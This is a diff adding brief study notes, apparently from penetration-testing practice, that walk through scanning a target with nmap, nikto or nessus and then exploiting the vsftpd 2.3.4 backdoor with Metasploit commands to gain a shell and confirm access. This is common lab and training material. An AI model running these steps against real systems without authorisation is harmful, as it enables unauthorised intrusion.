@@ -1,0 +1,16 @@
+* get the ip address of the target machine
+* use nmap tool to scan and enumerate to find loopholes
+* get the vulurebility using nikto or nessus tools
+* open new terminal 
+* use msfconsole tool 
+
+now ftp vulurebility
+
+* search vsftpd 2.3.4
+* use 0
+* show options
+* set RHOSTS ip address of the target 
+* exploit
+* hostname to know truely if you are inside the target machine
+* ifconfig to know if it similar to the target ip address
+
